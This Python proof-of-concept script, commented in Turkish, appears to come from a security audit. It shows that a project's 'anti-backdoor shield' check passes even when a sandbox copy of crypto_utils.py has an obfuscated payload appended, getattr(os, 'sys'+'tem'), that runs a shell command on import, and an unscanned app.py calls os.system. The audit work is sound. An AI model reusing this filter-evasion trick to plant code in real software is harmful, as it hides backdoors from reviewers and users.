#!/usr/bin/env python3
"""PoC 08: 'Zero-Trust Anti-Backdoor Shield' baypas edilebilir ve ozet degeri dogrulanmiyor.

Zafiyet: verify_runtime_backdoor_shield() yalnizca 5 literal alt-dizgeyi 9 modulde arar
ve hesapladigi SHA3-256 ozetini HICBIR sabit degerle karsilastirmaz. app.py gibi kritik
dosyalar taranmaz. Arka kapi enjeksiyonu tespit edilmeden gecer.
"""
import os
import sys
import shutil

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SANDBOX = "/tmp/opencode/aegis_poc/poc08"
shutil.rmtree(SANDBOX, ignore_errors=True)
os.makedirs(SANDBOX)
os.chdir(SANDBOX)
sys.path.insert(0, PROJECT_DIR)

import military_audit

CORE = [
    "military_vault.py", "vault_storage.py", "crypto_utils.py", "crypto_chat.py",
    "live_p2p_chat.py", "airgap_crypto.py", "steganography.py", "crypto_portfolio.py",
    "updater.py",
]


def banner(title):
    print("\n" + "=" * 72)
    print(" " + title)
    print("=" * 72)


banner("PoC 08: Anti-Backdoor Shield baypasi")

for mod in CORE + ["military_audit.py"]:
    shutil.copy(os.path.join(PROJECT_DIR, mod), os.path.join(SANDBOX, mod))

PAYLOAD = (
    "\n\nimport os as _poc_os\n"
    "getattr(_poc_os, 'sys' + 'tem')('echo ARKA_KAPI_CALISTI > backdoor_proof.txt')\n"
    "print('[!] Enjekte edilen arka kapi import aninda calisti')\n"
)
with open(os.path.join(SANDBOX, "crypto_utils.py"), "a", encoding="utf-8") as f:
    f.write(PAYLOAD)
print("[1] crypto_utils.py icine alt-dizge filtresini atlatan arka kapi eklendi:")
print("    getattr(_poc_os, 'sys' + 'tem')(...)  <- 'os.system(' alt-dizgesi gecmez")

with open(os.path.join(SANDBOX, "app.py"), "w", encoding="utf-8") as f:
    f.write("import os\nos.system('id')  # en bariz arka kapi\n")
print("[2] app.py icine acik acik 'os.system(' yazildi (app.py hic taranmiyor)")

military_audit.__file__ = os.path.join(SANDBOX, "military_audit.py")
ok, msg = military_audit.verify_runtime_backdoor_shield()
print(f"\n[3] verify_runtime_backdoor_shield() sonucu: passed={ok}")
print(f"    mesaj: {msg}")
assert ok is True, "shiled baypas edilemedi (beklenmiyordu)"
print("    [!!] Arka kapi ve 'os.system(' iceren app.py TESPIT EDILMEDI")

import importlib.util
spec = importlib.util.spec_from_file_location("sandbox_crypto_utils", os.path.join(SANDBOX, "crypto_utils.py"))
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
proof = os.path.exists("backdoor_proof.txt")
print(f"\n[4] Arka kapi gercekten calisti mi? proof dosyasi: {proof}")
if proof:
    print(f"    Icerik: {open('backdoor_proof.txt', encoding='utf-8').read().strip()}")

print("\n[5] Ozet degeri (SHA3-256) kod tabaninda herhangi bir sabitle karsilastiriliyor mu?")
hits = []
for root, _, files in os.walk(PROJECT_DIR):
    if ".git" in root or "security_audit" in root:
        continue
    for fn in files:
        if fn.endswith(".py"):
            p = os.path.join(root, fn)
            with open(p, encoding="utf-8", errors="ignore") as f:
                for i, line in enumerate(f, 1):
                    if "verify_runtime_backdoor_shield" in line and "def " not in line:
                        hits.append(f"{fn}:{i}: {line.strip()}")
print("    Cagri yerleri:")
for h in hits:
    print(f"    {h}")
print("    -> Donen ozet yalnizca POST mesaj metnine giriyor; sabit referans YOK.")

print("\n" + "-" * 72)
print("KANIT: 'Zero-Trust AST scanner & runtime codebase shield' iddiasi guvenlik saglamiyor:")
print("       (a) 5 literal alt-dizge filtresi trivial bicimde atlatildi,")
print("       (b) SHA3-256 ozeti hicbir yerde dogrulanmiyor (supply-chain korumasi yok),")
print("       (c) app.py dahil kritik dosyalar tarama listesinde degil.")
print("-" * 72)
